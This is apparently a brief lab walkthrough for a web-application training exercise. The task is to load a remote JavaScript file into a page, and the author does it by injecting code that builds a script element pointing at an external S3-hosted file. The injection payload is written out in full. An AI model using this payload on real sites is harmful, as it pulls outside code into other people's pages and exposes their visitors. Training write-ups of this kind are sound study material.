## Task 10 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/10)</small>

Objectives:

1. Include the JS file available at http://demofilespa.s3.amazonaws.com/jfptest.js into this page

Luckily we have a remote script here, and we just need to include it in the DOM.

On checking I found that the value of input tag is being rendered in the `script` tag

![](https://i.imgur.com/sqRmmWf.png)

Since you are already in script, you can not open new html tag. So what I thought of is, why not create a script tag using Document.createElement and append it to the body.

And it worked!!!

```js
const script = document.createElement("script");
script.src = "http://demofilespa.s3.amazonaws.com/jfptest.js";
document.body.appendChild(script);
```

For POC, paste the above content in the input field and hit enter
